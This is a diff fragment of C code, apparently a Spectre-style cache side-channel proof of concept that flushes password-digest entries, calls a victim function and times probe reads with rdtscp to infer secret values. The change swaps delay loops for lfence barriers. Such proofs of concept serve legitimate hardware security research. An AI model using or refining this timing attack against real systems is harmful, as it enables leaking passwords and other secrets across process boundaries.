@@ -63,6 +63,8 @@ int main(int argn, char *argv[]) {
 			secret[i] = rand() % SIZE;
 		}
 
+		int wrongPassword = passwordDigest[userUnderAttack] + 1;
+
 		for (int i = 0; i < class; i++) {
 			results[i] = 0;
 		}
@@ -80,20 +82,15 @@ int main(int argn, char *argv[]) {
 					_mm_clflush(&passwordDigest[i]);
 				}
 
-				for (volatile int z = 0; z < 100; z++) {
-				}
+				_mm_lfence();
 
 				victim_function(userUnderAttack, 1);
-
-				for (volatile int z = 0; z < 100; z++) {
-				}
 
 				time1 = __rdtscp(&timeReg);
 				timeReg = array2[l * delta];
 				time2 = __rdtscp(&timeReg) - time1;
 
-				for (volatile int z = 0; z < 100; z++) {
-				}
+				_mm_lfence();
 
 				if ((int) time2 <= cacheHitThreshold) {
 					results[l]++;
